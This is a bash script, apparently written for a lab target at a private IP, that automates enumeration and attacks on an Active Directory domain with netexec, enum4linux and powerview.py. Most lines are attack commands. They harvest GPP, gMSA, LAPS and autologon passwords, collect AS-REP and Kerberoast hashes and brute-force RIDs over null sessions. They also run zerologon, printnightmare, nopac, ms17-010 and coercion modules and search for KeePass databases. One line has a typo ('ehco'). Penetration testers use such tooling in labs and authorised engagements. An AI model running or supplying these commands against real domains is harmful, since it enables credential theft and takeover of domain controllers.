#! /bin/bash
ip="10.129.42.188"
username=""
password=""

# Usage: sudo apt-get install expect-dev 
# arch: sudo pacman -Syy install expect
# unbuffer bash EnumAD.sh | tee output.log
# less -r output.log

# Require: netexec, powerview.py, enum4linux


# enum4linux
echo -e "=== enum4linux ==="
enum4linux -a -A -u "$username" -p "$password" "$ip" 

# netexec 
echo -e "\n=== NETEXEC ==="

echo -e "\n[*] Enum smb with netexec (null session)..." 
netexec smb $ip -u '' -p '' --shares 
netexec smb $ip -u 'guest' -p '' --shares 

if [[ -n "$password" ]]; then
	echo -e "\n[*] Checking current user smb/winrm/rdp/mssql permission ... " 
	netexec smb $ip -u "$username" -p "$password" 
	netexec wmi $ip -u "$username" -p "$password" 
	netexec winrm $ip -u "$username" -p "$password" 
	netexec rdp $ip -u "$username" -p "$password"    
	netexec mssql $ip -u "$username" -p "$password" -M mssql_priv

	echo -e "\n[*] Checking current user (local-auth) smb/winrm/rdp/mssql permission ... " 
	netexec rdp $ip -u "$username" -p "$password"   --local-auth
	netexec winrm $ip -u "$username" -p "$password"  --local-auth
	netexec smb $ip -u "$username" -p "$password"  --local-auth
	netexec mssql $ip -u "$username" -p "$password"  --local-auth  -M mssql_priv

	echo -e "\n[*] Current user groups"
	netexec ldap $ip -u "$username" -p "$password" -M groupmembership -o USER="$username"

	echo -e "\n[*] Enum smb share folder ..." 
	netexec smb $ip -u "$username" -p "$password" --shares 
	
	echo -e "\n[*] Enum autologin via smb ..." 
	netexec smb $ip -u "$username" -p "$password" -M gpp_autologin 
	netexec smb $ip -u "$username" -p "$password" -M reg-winlogon
	
	echo -e "\n[*] Enum gpp_password via smb ..." 
	netexec smb $ip -u "$username" -p "$password" -M gpp_password  
	
	echo -e "\n[*] Enum gmsa password ..." 
	netexec ldap $ip -u "$username" -p "$password" --gmsa 
	
	echo -e "\n[*] Bloodhound collecting ..." 
	netexec ldap $ip -u "$username" -p "$password" --bloodhound -c all 
	
	echo -e "\n[*] Enum asreproast ..." 
	netexec ldap $ip -u "$username" -p "$password" --asreproast __netexec_asreproast.txt 
	
	echo -e "\n[*] Enum kerberoasting ..." 
	netexec ldap $ip -u "$username" -p "$password" --kerberoasting __netexec_kerberoasting.txt 

	echo -e "\n[*] ldap-checker via ldap ..." 
	netexec ldap $ip -u "$username" -p "$password" -M ldap-checker 

	echo -e "\n[*] Attack : webdav ..." 
	netexec smb $ip -u "$username" -p "$password" -M webdav 
	
	echo -e "\n[*] Attack : printnightmare ..." 
	netexec smb $ip -u "$username" -p "$password" -M printnightmare 
fi

echo -e "\n[*] Attack : nopac ..." 
netexec smb $ip -u "$username" -p "$password" -M nopac

echo -e "\n[*] Attack : spooler ..." 
netexec smb $ip -u "$username" -p "$password" -M spooler 

echo -e "\n[*] Attack: coerce_plus  ..." 
netexec smb $ip -u "$username" -p "$password" -M coerce_plus

echo -e "\n[*] Attack : zerologon (may take 1 minute to complete) ..." 
netexec smb $ip -u "$username" -p "$password" -M zerologon --timeout=60

echo -e "\n[*] Attack : ms17-010 ..." 
netexec smb $ip -u "$username" -p "$password" -M ms17-010 --timeout=60

echo -e "\n[*] Attack : smbghost ..." 
netexec smb $ip -u "$username" -p "$password" -M smbghost 

echo -e "\n[*] Attack : ioxidresolver ..." 
netexec smb $ip -u "$username" -p "$password" -M ioxidresolver 

echo -e "\n[*] Enum AV via smb ..." 
netexec smb $ip -u "$username" -p "$password" -M enum_av 
netexec smb $ip -u "$username" -p "$password" -M wcc

echo -e "\n[*] Enum ADCS ..." 
netexec ldap $ip -u "$username" -p "$password" -M adcs 
netexec smb $ip -u "$username" -p "$password" -M enum_ca 

echo -e "\n[*] Enum loggedon-users"
netexec smb $ip -u "$username" -p "$password" --loggedon-users

echo -e "\n[*] Enum domain-sid"
netexec ldap $ip -u "$username" -p "$password" --get-sid

echo -e "\n[*] Enum sessions"
netexec smb $ip -u "$username" -p "$password" --sessions

echo -e "\n[*] Enum computers via smb"
netexec smb $ip -u "$username" -p "$password" --computers

echo -e "\n[*] Enum enum_trusts ..." 
netexec ldap $ip -u "$username" -p "$password" -M enum_trusts 

echo -e "\n[*] Enum password-not-required ..." 
netexec ldap $ip -u "$username" -p "$password" --password-not-required 

echo -e "\n[*] Enum trusted for delegation and Unconstrained ..." 
netexec ldap $ip -u "$username" -p "$password" --trusted-for-delegation 

echo -e "\n[*] Enum TRUSTED_FOR_DELEGATION  ..." 
netexec ldap $ip -u "$username" -p "$password" --query "(userAccountControl:1.2.840.113556.1.4.803:=524288)" "sAMAccountName"

echo -e "\n[*] Enum TRUSTED_TO_AUTH_FOR_DELEGATION  ..." 
netexec ldap $ip -u "$username" -p "$password" --query "(userAccountControl:1.2.840.113556.1.4.803:=16777216)" "sAMAccountName"

echo -e '\n[*] Enum msds-allowedtodelegateto / Get-netUser -TrustedToAuth ...'
netexec ldap $ip -u "$username" -p "$password" --query "(msds-allowedtodelegateto=*)" "sAMAccountName"

echo -e '\n[*] Enum user account requires a smart card...'
netexec ldap $ip -u "$username" -p "$password" --query "(useraccountcontrol:1.2.840.113556.1.4.803:=262144)" "sAMAccountName"

echo -e '\n[*] Enum user has ENCRYPTED_TEXT_PWD_ALLOWED'
netexec ldap $ip -u "$username" -p "$password" --query "(useraccountcontrol:1.2.840.113556.1.4.803:=128)" "sAMAccountName"

echo -e '\n[*] Enum adminCount = 1'
netexec ldap $ip -u "$username" -p "$password" --query "(adminCount=1)" "sAMAccountName"
# netexec ldap $ip -u "$username" -p "$password" --admin-count

echo -e '\n[*] Enum DoesNotRequirePreAuth & adminCount = 1'
netexec ldap $ip -u "$username" -p "$password" --query "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(adminCount=1))" "sAMAccountName"

echo -e "\n[*] Enum pre 2000 computer  ..." 
netexec ldap $ip -u "$username" -p "$password" -M pre2k

echo -e "\n[*] Get-desc-users via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M get-desc-users 

echo -e "\n[*] get-unixUserPassword via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M get-unixUserPassword 

echo -e "\n[*] get-userPassword via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M get-userPassword 

echo -e "\n[*] laps via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M laps 

echo -e "\n[*] MachineAccountQuota via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M maq 

echo -e "\n[*] obsolete via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M obsolete 

echo -e "\n[*] pso via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M pso 

echo "Note: pso module for netexec may have some bug."
echo "Try: $ python3 ldapsearch-ad.py -l $ip -d domain.com -u $username -p $password  -t pass-pols"

echo -e "\n\n[*] subnets via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M subnets 

echo -e "\n[*] user-desc via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M user-desc 
echo "[!] Pleace check the log file will have more information."

echo -e "\n[*] DC List via ldap ..."
netexec ldap $ip -u "$username" -p "$password" --dc-list

echo -e "\n[*] get-network via ldap ..."
netexec ldap $ip -u "$username" -p "$password" -M get-network -o ALL=true


if [[ -n "$password" ]]; then
	echo -e "\n=== Powerview.py ==="

	echo -e "\n[*] Logon script on ldap"
	powerview "$username":"$password"@$ip -q 'Get-DomainObject -Where "scriptPath not null" -Select sAMAccountName,lastLogon,lastLogonTimestamp,logonCount,scriptPath -TableView'

	echo -e "\n[*] Who can write SPN ?"
	powerview "$username":"$password"@$ip -q 'Get-DomainObjectAcl -ResolveGUIDs -Where "ObjectAceType match Service-Principal-Name" -Select ObjectDN,AccessMask,SecurityIdentifier -TableView'

	echo -e "\n[*] Who can create GPO ?"
	powerview "$username":"$password"@$ip -q 'Get-DomainObjectAcl -Identity "Policies" -Where "AccessMask contain CreateChild" -Select SecurityIdentifier'

	echo -e "\n[*] Who can modify GPO ?"
	command_output=$(powerview "$username":"$password"@"$ip" -q 'Get-DomainGPO -Select cn' --no-admin-check --no-cache | grep '^{')
	echo "$command_output" | while IFS= read -r line; do
		echo "[GPO]: $line"
		powerview "$username":"$password"@"$ip" -q "Get-DomainObjectAcl -Identity $line -Select ActiveDirectoryRights,SecurityIdentifier -ResolveGUIDs -TableView"
	done

	echo -e "\n[*] Who can link GPO for Domain or OU?"
	powerview "$username":"$password"@"$ip" -q "Get-DomainObjectAcl -ResolveGUIDs -Where 'ObjectAceType match GP-Link' -NoCache -Select ObjectDN,AccessMask,SecurityIdentifier -TableView"

	ehco -e "\n[*] Who can modify GPO for site?"
	command_output=$(powerview "$username":"$password"@"$ip" -q 'Get-Domain -Select subRefs' | grep "CN=Configuration,")
	echo "$command_output" | while IFS= read -r line; do
		echo "[SearchBase]: CN=Sites,$line"
		powerview "$username":"$password"@"$ip" -q "Get-DomainObjectAcl  -SearchBase \"CN=Sites,$line\" -ResolveGUIDs -TableView -Select ObjectDN,ActiveDirectoryRights,SecurityIdentifier"
	done

fi

echo -e "\n=== NETEXEC : More General enumlation ==="

echo -e "\n[*] Enum active user via ldap ..."
netexec ldap $ip -u "$username" -p "$password" --query  "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" "sAMAccountName description" 

echo -e "\n[*] Enum disable user via ldap ..."
netexec ldap $ip -u "$username" -p "$password" --query  "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" "sAMAccountName description" 

echo -e "\n[*] Enum all users via ldap "
netexec ldap $ip -u "$username" -p "$password" --query  "(objectClass=user)" "sAMAccountName description"

echo -e "\n[*] Enum all groups via ldap "
netexec ldap $ip -u "$username" -p "$password" --query  "(objectClass=group)" "sAMAccountName description" 

echo -e "\n[*] Enum all computers via ldap"
netexec ldap $ip -u "$username" -p "$password" --query  "(objectCategory=computer)" "sAMAccountName description" 

# echo -e "\n[*] Enum user & groups via ldap in netexec way (May have bug for null session)"
# netexec ldap $ip -u "$username" -p "$password" --users --groups

if [[ -n "$password" ]]; then
	echo -e "\n [~] No need to brute rid for null session"
else
	echo -e "\n[*] Rid brute via null session(limit to 10000)..." 
	netexec smb $ip -u '' -p '' --rid-brute 10000 
	
	echo -e "\n[*] Rid brute via guest account (limit to 10000)..." 
	netexec smb $ip -u 'guest' -p '' --rid-brute 10000 

	echo -e "\n[*] Enum user via ldap (null session)..." 
	netexec ldap $ip -u '' -p '' --users 
fi

echo -e "\n=== NETEXEC : POST explotion TEST ===="

if [[ -n "$password" ]]; then
	echo -e "\n[*] keepass discover ..."
	netexec smb $ip -u "$username" -p "$password" -M keepass_discover
fi